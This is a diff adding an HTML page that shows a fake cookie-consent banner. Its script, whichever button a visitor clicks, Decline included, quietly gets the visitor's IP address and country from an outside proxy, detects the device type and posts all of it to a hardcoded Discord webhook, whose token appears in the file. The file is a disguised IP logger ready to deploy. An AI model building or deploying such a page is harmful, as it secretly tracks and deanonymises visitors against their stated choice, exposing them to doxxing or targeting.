@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0; padding: 0;
+      background: #0a0a0a;
+      color: #e0e0e0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #cookie-box {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1e1e1e;
+      border: 1px solid #444;
+      border-radius: 12px;
+      padding: 24px;
+      max-width: 480px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+      z-index: 9999;
+    }
+    p {
+      margin: 0 0 18px;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+    button {
+      padding: 12px 32px;
+      margin: 0 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #accept-btn { background: #2ecc71; color: black; }
+    #accept-btn:hover { background: #27ae60; }
+    #decline-btn { background: #e74c3c; color: white; }
+    #decline-btn:hover { background: #c0392b; }
+  </style>
+</head>
+<body>
+
+<div id="cookie-box">
+  <p>This site uses cookies to improve your experience and for analytics.<br>Click Accept or Decline to continue.</p>
+  <button id="accept-btn">Accept</button>
+  <button id="decline-btn">Decline</button>
+</div>
+
+<script>
+// YOUR WEBHOOK ────────────────────────────────────────────────
+const WEBHOOK = "https://discord.com/api/webhooks/1451103247904280589/y9If0_Hc3fqrjBmZmIcMupGkAvoUE6efqqOM3-8DsGmH9M_vnToR9fwrUpd7E9bljpSd";
+
+// CHANGE THIS to your actual Vercel proxy URL after you deploy it
+const IP_PROXY = "https://ipss-1kqp.vercel.app/";
+// ──────────────────────────────────────────────────────────────
+
+async function logClick(choice) {
+  try {
+    // Get IP + country from your server-side proxy
+    let ipData = {};
+    try {
+      const res = await fetch(IP_PROXY);
+      if (res.ok) ipData = await res.json();
+    } catch (e) {
+      console.warn("Proxy fetch failed", e);
+    }
+
+    // Simple device detection
+    const ua = navigator.userAgent.toLowerCase();
+    let device = "PC/Desktop";
+    if (/mobile|android|iphone|ipad|ipod|windows phone/i.test(ua)) {
+      device = "Phone";
+      if (/ipad|tablet/i.test(ua)) device = "Tablet";
+      if (/android/i.test(ua)) device += " (Android)";
+      if (/iphone|ipad|ipod/i.test(ua)) device += " (iOS)";
+    }
+
+    const info = {
+      time: new Date().toISOString(),
+      clicked: choice,
+      ip: ipData.ip || ipData.IPv4 || ipData.query || "failed",
+      country: ipData.country || ipData.country_name || ipData.countryCode || "unknown",
+      device: device
+    };
+
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `**${choice}** • ${info.country} • ${info.device}`,
+        embeds: [{
+          color: choice === "Accept" ? 0x2ecc71 : 0xe74c3c,
+          fields: [
+            { name: "IP", value: info.ip, inline: true },
+            { name: "Country", value: info.country, inline: true },
+            { name: "Device", value: info.device, inline: true }
+          ],
+          timestamp: info.time
+        }]
+      })
+    });
+  } catch (err) {
+    // silent fail
+  }
+
+  // Hide banner after click (they still "get in")
+  document.getElementById("cookie-box").style.display = "none";
+}
+
+document.getElementById("accept-btn").onclick = () => logClick("Accept");
+document.getElementById("decline-btn").onclick = () => logClick("Decline");
+</script>
+
+</body>
+</html>
